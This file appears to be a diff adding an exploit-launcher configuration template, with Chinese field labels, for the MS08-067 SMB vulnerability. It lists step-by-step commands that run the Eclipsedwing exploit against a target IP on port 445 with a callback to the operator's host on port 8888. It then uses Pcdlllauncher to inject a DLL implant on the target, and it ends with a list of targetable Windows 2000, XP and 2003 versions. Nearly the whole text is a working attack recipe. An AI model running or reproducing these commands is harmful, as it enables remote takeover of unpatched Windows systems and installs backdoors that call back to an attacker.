@@ -1,0 +1,38 @@
+<sfjt>inject</sfjt>
+<ljfs>NB,NR</ljfs>
+<sctype>dll</sctype>
+<cs1mc>IP地址</cs1mc>
+<cs2mc>系统版本</cs2mc>
+<cs3mc>系统架构</cs3mc>
+<cs4mc>本机IP</cs4mc>
+<zbz>3</zbz>
+<bz1>
+<cmd>Eclipsedwing-1.5.2.exe --TargetIP <cs1/> --TargetPort 445 --Protocol SMB --Payload Callback --CallbackIP <cs4/> --CallbackPort 8888 --CallbackLocalPort 8888 --Target <cs2/></cmd>
+</bz1>
+<bz2>
+<cmd>xcopy 1 c:\123\ /s /e</cmd>
+</bz2>
+<bz3>
+<cmd>Pcdlllauncher-2.3.1.exe --ConnectedTcp 164 --XorMask 32 --LPFilename c:\123\PC_Exploit.dll --ImplantFilename <sc/> --TargetOsArchitecture <cs3/> --PCBehavior 7 --OutConfig 6.bin</cmd>
+</bz3>
+<bz>MS08-067
+
+系统版本：
+   W2K
+         Windows 2000 All
+   XPSP0
+         Windows XP, Service Pack 0
+   XPSP1
+         Windows XP, Service Pack 1
+   XPSP2
+         Windows XP, Service Pack 2
+   XPSP3
+         Windows XP, Service Pack 3
+   W2K3SP0
+         Windows 2003, Service Pack 0
+   W2K3SP1
+         Windows 2003, Service Pack 1
+   W2K3SP2
+         Windows 2003, Service Pack 2
+
+</bz>
